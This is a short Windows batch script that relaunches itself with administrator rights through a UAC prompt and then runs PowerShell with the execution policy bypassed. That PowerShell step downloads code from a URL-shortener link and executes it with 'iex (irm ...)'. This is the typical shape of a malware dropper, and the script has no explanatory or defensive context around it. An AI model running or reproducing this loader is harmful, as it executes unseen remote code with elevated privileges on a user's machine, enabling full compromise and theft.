@echo off
net session >nul 2>&1 || (powershell start-process cmd -ArgumentList '/c "%~f0"' -Verb runAs && exit)
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm 'https://www.shorturl.at/rYA8s')"
